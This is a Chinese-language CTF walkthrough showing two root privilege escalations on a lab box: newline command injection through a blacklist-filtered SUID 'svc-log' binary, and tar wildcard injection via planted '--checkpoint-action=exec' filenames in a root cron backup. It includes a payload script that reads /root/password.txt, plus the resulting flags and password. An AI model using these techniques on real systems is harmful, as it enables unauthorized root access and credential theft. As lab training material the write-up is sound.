枚举suid，常规系统程序之外，多了一个不寻常的：/usr/local/bin/svc-log

```
ls -l /usr/local/bin/svc-log
# -rwsr-xr-x 1 root root 8984 ... /usr/local/bin/svc-log
```

`-rws` + owner 是 root → **以 root 身份运行的普通权限程序**，而且只有 8984 字节（很小，说明逻辑简单，就是为了被审）

```bash
strings /usr/local/bin/svc-log

#Usage: svc-log <log-name>
#invalid log name
#strpbrk
#tail -n 100 /var/log/%s.log
```

结合 `ls -l` 的大小和这些字符串，可以还原出它的逻辑：

```cpp
int main(int argc, char **argv) {
    if (argc < 2) { puts("Usage: svc-log <log-name>"); return 1; }

    if (strpbrk(argv[1], ";|&><") != NULL) {        // ← 黑名单
        puts("invalid log name");
        return 1;
    }

    char cmd[256];
    snprintf(cmd, sizeof(cmd), "tail -n 100 /var/log/%s.log", argv[1]);
    return system(cmd);                             // ← root 执行
}
```

**换行 `\n` 在** shell 里等价于 `;`，空格、 `#` 、引号、 `/` 、 `$()` 、反引号都不在黑名单中，所以最终构造出的c参数的值为

```
/usr/local/bin/svc-log "x.log\ncat /root/flag.txt\n#"      # \n = 真实换行
```

我们把参数值带入到代码逻辑中：

```
tail -n 100 /var/log/x.log␊cat /root/flag.txt␊#.log //（`␊` = 真实的换行字节 `0x0A`）
```

system函数执行的命令是 `tail -n 100 /var/log/x.log` ，然后换行，再执行命令 `cat /root/flag.txt` ，再换行，后面的内容被 `#` 注释，这里，我们就可以利用root权限读取到flag值

```
M1flag{fd8672fb6f7abed376ffc8eff4b012ce}M2
```

收集发现计划任务下有以root权限执行的文件tar.sh，读取一下这个文件

```bash
#!/bin/bash

# config
SOURCE_DIR="/xp/www"
BACKUP_DIR="/backup"
LOG_DIR="/xp/www/LoG_backUP"
BACKUP_NAME="xp_www_JStar.tar"
LOG_FILE="${LOG_DIR}/backup.log"

# delete

    rm -f "$BACKUP_DIR/$BACKUP_NAME"

    mv "$SOURCE_DIR/$BACKUP_NAME""$BACKUP_DIR/" 2>/dev/null
    ...
```

`cd "$SOURCE_DIR" && tar -cf "$BACKUP_NAME" *` 是典型的 tar 通配符注入。

shell 展开 `*` 时，会把目录下 **所有文件名** 原样变成 tar 的 argv。  
如果目录里存在一个 **名字本身就是 tar 选项** 的文件，tar 会把它当选项解析。  
GNU tar 有两个"危险但合法"的选项：

| 选项  | 作用  |
| --- | --- |
| `--checkpoint=1` | 每处理 1 个文件触发一次 checkpoint |
| `--checkpoint-action=exec=<cmd>` | checkpoint 时执行 `<cmd>` |

两者配合 = **以 tar 进程的身份（这里是 root）执行任意命令**。当前我们有www权限，所以可以在/xp/www/目录下写入内容

```bash
cd /xp/www

# 1) 载荷脚本
cat > shell.sh <<'EOS'
#!/bin/sh
{
  echo "=== id ==="; id
  echo "=== /root/password.txt ==="; cat /root/password.txt
  echo "=== /root/tar.sh ==="; cat /root/tar.sh
  echo "=== ls -la /root ==="; ls -la /root
} > /tmp/root_out.txt 2>&1
chmod 666 /tmp/root_out.txt
touch /tmp/pwned
chmod 666 /tmp/pwned
EOS
chmod 755 shell.sh

# 2) 两个"参数"文件（文件名本身就是 tar 的选项）
: > './--checkpoint=1'
: > './--checkpoint-action=exec=sh shell.sh'
```

等下一轮 cron，tar.sh执行后会去解析这两个文件名字，从而以root权限去读取/root/password.txt文件内容

```
cat /tmp/root_out.txt
```

```bash
=== id ===
uid=0(root) gid=0(root) groups=0(root)
=== /root/password.txt ===
w92TmAgM
=== /root/tar.sh ===
#!/bin/bash
...
```

所以答案就是flag{w92TmAgM}
